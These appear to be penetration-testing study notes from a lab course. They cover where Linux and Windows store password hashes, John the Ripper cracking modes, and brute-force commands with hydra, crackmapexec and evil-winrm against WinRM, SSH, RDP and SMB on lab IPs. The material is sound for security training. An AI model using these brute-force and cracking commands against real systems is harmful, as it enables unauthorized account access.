# Password Attacks
- [Introduction](#introduction)
    - [Credential Storage in linux](#credential-storage-in-linux)
    - [Credential Storage in windows](#credential-storage-in-windows)
    - [John The Ripper](#john-the-ripper)
- [Remote Password Attacks](#remote-password-attacks)
    - [Network Services](#network-services)

## Introduction
### Credential Storage in linux 
- Encrypted passwords in `/etc/shadow`
- Cryptographic hash methods: 

|ID	|Cryptographic Hash Algorithm|
|---|----------------------------|
|`$1$`|	MD5|
|`$2a$`|	Blowfish|
|`$5$`|	SHA-256|
|`$6$`|	SHA-512|
|`$sha1$`|	SHA1crypt|
|`$y$`|	Yescrypt|
|`$gy$`|	Gost-yescrypt|
|`$7$`|	Scrypt|



```
cat /etc/passwd

...SNIP...
htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash
```

- The `x` in the password field indicates that the encrypted password is in the `/etc/shadow` file.

> [!WARNING]
> Password empty field means that we can log in with the username without entering a password.

### Credential Storage in windows 
- Winlogon is a trusted process responsible for managing security-related user interactions. These include:

    - Launching LogonUI to enter passwords at login
    - Changing passwords
    - Locking and unlocking the workstation

- Each interactive logon session creates a separate instance of the Winlogon service.

- Authentication packages are the Dynamic-Link Libraries (DLLs) that perform authentication checks. For example, for non-domain joined and interactive logins, the authentication package `Msv1_0.dll` is used.

- **Authentication Flow**
- Winlogon is the only process that intercepts login requests from the keyboard sent via an RPC message from Win32k.sys. Winlogon immediately launches the LogonUI application at logon to display the user interface for logon. After Winlogon obtains a user name and password from the credential providers, it calls LSASS to authenticate the user attempting to log in.

- **Local Security Authority Subsystem Service (LSASS)**: is a collection of many modules and has access to all authentication processes that can be found in `%SystemRoot%\System32\Lsass.exe`.
    - This service is responsible for: 
        - The local system security policy
        - User authentication
        - Sending security audit logs to the Event log

|Authentication Packages|	Description|
|-----------------------|--------------|
|Lsasrv.dll|	The LSA Server service both enforces security policies and acts as the security package manager for the LSA. The LSA contains the Negotiate function, which selects either the NTLM or Kerberos protocol after determining which protocol is to be successful.|
|Msv1_0.dll|	Authentication package for local machine logons that don't require custom authentication.|
|Samsrv.dll|	The Security Accounts Manager (SAM) stores local security accounts, enforces locally stored policies, and supports APIs.|
|Kerberos.dll|	Security package loaded by the LSA for Kerberos-based authentication on a machine.|
|Netlogon.dll|	Network-based logon service.|
|Ntdsa.dll|	This library is used to create new records and folders in the Windows registry.|

- **Security Account Manager (SAM)**
    - SAM is a database file in Windows operating systems that stores users' passwords
    - It can be used to authenticate local and remote users.
    - User passwords are stored in a hash format in a registry structure as either an LM hash or an NTLM hash.
    - This file is located in `%SystemRoot%/system32/config/SAM` and is mounted on HKLM/SAM.


### John The Ripper
- **Cracking Modes**
    - Single crack Mode: `john --format=<hash_type> <hash or hash_file>` , `--wordlist` option
    - Wordlist Mode: `john --wordlist=<wordlist_file>,<wordlist_file>,<wordlist_file> --rules <hash_file>`
    - Incremental Mode



## Remote Password Attacks
### Network Services
#### WinRM
- Using CrackMapExec: 
    - `crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>` e.g. `crackmapexec winrm 10.129.42.197 -u user.list -p password.list`
    - The appearance of (Pwn3d!) is the sign that we can most likely execute system commands if we log in with the brute-forced user
- Using Evil-WinRM: 
    - `evil-winrm -i <target-IP> -u <username> -p <password>` e.g. `evil-winrm -i 10.129.42.197 -u user -p password`

#### SSH 
- Using Hydra:
    - `hydra -L user.list -P password.list ssh://10.129.42.197`

#### Remote Desktop Protocol (RDP)
- Using Hydra:
    - `hydra -L user.list -P password.list rdp://10.129.42.197`

#### SMB
- Using Hydra:
    - `hydra -L user.list -P password.list smb://10.129.42.197`
- Using auxiliary(scanner/smb/smb_login) in Metasploit

- Interact with it using crackmapexec or smbclient 
    - `crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares`
    - `smbclient -U user \\\\10.129.42.197\\SHARENAME`

